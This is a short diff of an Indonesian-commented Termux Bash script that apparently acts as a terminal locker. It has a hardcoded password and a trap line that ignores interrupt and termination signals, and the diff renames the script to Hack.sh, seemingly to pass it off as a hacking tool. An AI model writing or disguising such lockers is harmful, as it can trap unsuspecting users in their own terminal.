@@ -2,7 +2,7 @@
 
 LOCK_FILE="$HOME/.termux_lock"
 PASSWORD="infernalxploit" # Ganti dengan password kamu
-SCRIPT_PATH="$HOME/lock.sh" # Path script ini
+SCRIPT_PATH="$HOME/Hack.sh" # Nama file diubah jadi Hack.sh
 
 # Matikan fungsi CTRL+C, CTRL+Z, dan keluar paksa
 trap '' SIGINT SIGTSTP SIGQUIT SIGTERM
